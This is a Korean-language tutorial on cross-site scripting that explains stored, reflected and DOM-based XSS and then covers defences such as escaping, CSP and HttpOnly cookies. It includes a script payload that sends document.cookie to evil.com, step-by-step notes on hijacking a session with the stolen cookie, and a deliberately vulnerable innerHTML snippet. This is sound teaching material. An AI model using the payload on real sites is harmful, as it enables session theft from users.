# 🛡️ XSS (Cross-Site Scripting)

웹 애플리케이션 보안에서 가장 널리 알려진 공격 방식 중 하나로, 사용자의 입력을 검증 없이 DOM이나 HTML에 출력할 때 발생합니다.  

---

## 1️⃣ XSS란?

- **Cross-Site Scripting (XSS)** 는 악성 스크립트를 웹 페이지에 삽입하여, 사용자의 브라우저에서 실행되도록 하는 보안 취약점입니다.
- 세션 탈취, 피싱, 클릭재킹, UI 변조 등 다양한 공격으로 이어질 수 있습니다.

---

## 2️⃣ XSS 유형

### 1) 저장형 (Stored XSS)

- 공격자가 입력한 스크립트가 **서버 DB 등에 저장되어** 다른 사용자에게 노출
- 예: 게시판, 댓글, 프로필 등

```html
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

#### 공격 흐름
1. 공격자가 이 코드를 댓글, 게시물, 사용자 소개란 등에 삽입
2. 해당 내용이 DB에 저장되고, 서버가 이를 HTML로 렌더링함
3. 다른 사용자가 페이지를 열었을 때, 이 <script>가 그 사람 브라우저에서 실행됨
4. 실행된 스크립트는 document.cookie 를 통해 현재 사용자의 세션 쿠키를 읽음
5. 읽은 쿠키를 https://evil.com 으로 전송
6. 공격자는 받은 쿠키를 자기 브라우저에 복사해서 로그인 세션 탈취 가능

---

### 2) 반사형 (Reflected XSS)

악성 스크립트가 요청(URL, 파라미터, 폼 등) 에 포함돼 있고, 서버가 그 값을 검증 없이 응답에 반영하면, 브라우저에서 바로 실행되는 공격

```
https://example.com?q=<script>alert(1)</script>
```

#### 공격 흐름
1. 공격자는 위와 같은 URL을 만들어서 이메일, 메시지, SNS 등에 공유
2. 사용자가 이 URL을 클릭해서 접속
3. 서버가 q 파라미터의 값을 검증 없이 HTML에 그대로 출력
```html
<h1>검색 결과: <script>alert(1)</script></h1>
```
4. 브라우저는 이 HTML을 받아서 렌더링 → <script>가 실행

---

### 3) DOM 기반 XSS

- 서버가 아닌, 클라이언트(브라우저)에서 실행 중인 JavaScript가 사용자 입력을 직접 DOM에 삽입하면서 발생하는 XSS
- 보통 innerHTML, document.write, eval, location.hash 같은 API가 제대로 필터링 없이 사용될 때 발생

```js
const search = location.hash.slice(1);
document.body.innerHTML = "검색어: " + search;
```

#### 공격 흐름
1. 사용자가 다음 URL로 접근:
```
https://example.com/#<img src=x onerror=alert(1)>
```
2. `location.hash.slice(1)` → `"<img src=x onerror=alert(1)>"` 문자열이 `search` 변수에 들어감
3. `document.body.innerHTML` 안에 그대로 넣으면서 브라우저가 이 HTML을 진짜 DOM으로 파싱
4. <img> 태그가 렌더링되고, 이미지를 찾을 수 없으므로 `onerror` 트리거 → `alert(1)` 실행됨

---

## 3️⃣ 공격 결과 예시

| 피해 | 설명 |
|------|------|
| 세션 탈취 | `document.cookie`를 전송하여 로그인 탈취 |
| 키로깅 | 사용자 입력값 수집 |
| 피싱 | 가짜 로그인 UI 삽입 |
| 페이지 조작 | DOM 조작으로 사용자 유도 |

---

## 4️⃣ 방어 방법

### 1) 출력 시 이스케이프 (Output Escaping)

- HTML, 속성, JS context에 따라 출력값 이스케이프 필요

```js
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, (m) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;",
    '"': "&quot;", "'": "&#039;"
  })[m]);
}
```

---

### 2) 입력 검증

- `<script>`, `on*`, `javascript:` 등 금지 패턴 필터링
- 가능한 경우 **화이트리스트 기반 허용**

---

### 3) DOM 조작 방식 변경

- `innerHTML` ❌ → `textContent`, `createElement` ✅

```js
element.textContent = userInput;
```

---

### 4) Content Security Policy (CSP)

- 인라인 스크립트, 외부 출처 스크립트 제한

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

### 5) HttpOnly 쿠키 설정

- 쿠키를 JS에서 접근 불가능하게 하여 탈취 방지

```http
Set-Cookie: session=abc; HttpOnly; Secure
```

---

## 5️⃣ 프레임워크별 자동 방어

| 프레임워크 | 특징 |
|------------|------|
| React | JSX는 자동 escape 처리 (`<script>` 렌더링 불가) |
| Vue | Mustache(`{{ }}`) escape, `v-html` 사용 시 주의 |
| Angular | Strict Contextual Escaping + DomSanitizer |

---

## 🎯 정리

✔ XSS는 **입력 → 실행**이 연결되는 보안 이슈  
✔ **출력 시 이스케이프**가 핵심 방어  
✔ CSP, HttpOnly 쿠키, DOM 안전 API 사용으로 보안 강화  
✔ React/Vue 등은 기본적으로 방어하지만 `dangerouslySetInnerHTML`, `v-html` 등은 주의 필요
